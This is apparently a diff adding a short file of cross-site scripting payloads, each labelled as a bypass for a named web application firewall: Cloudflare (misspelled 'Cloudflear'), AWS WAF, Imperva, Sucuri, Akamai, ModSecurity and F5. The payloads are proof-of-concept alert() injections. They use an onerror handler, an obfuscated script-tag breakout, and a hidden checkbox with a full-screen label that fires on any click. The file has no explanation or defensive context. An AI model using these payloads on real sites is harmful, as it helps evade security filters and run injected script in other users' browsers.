@@ -1,0 +1,33 @@
+Cloudflear bypass payload 
+
+<img src=x onerror=(a=alert,b=1,a(b))>
+
+<input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange="top[['alert'][0]](location.hostname);this.remove()">
+<label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>
+
+AWS WAF bypass payload 
+
+<img src=x onerror=(a=alert,b=1,a(b))>
+
+Imperva bypass payload 
+
+1'//"</Script><Img/Src%0AOnError=alert(1)//
+
+Sucuri bypass payload 
+
+1'//"</Script><Img/Src%0AOnError=alert(1)//
+
+Akamai bypass payload 
+
+1'//"</Script><Img/Src%0AOnError=alert(1)//
+
+ModSecurity bypass payload 
+
+<input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange="top[['alert'][0]](location.hostname);this.remove()">
+<label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>
+
+F5 bypass payload 
+
+<input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange="top[['alert'][0]](location.hostname);this.remove()">
+<label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>
+
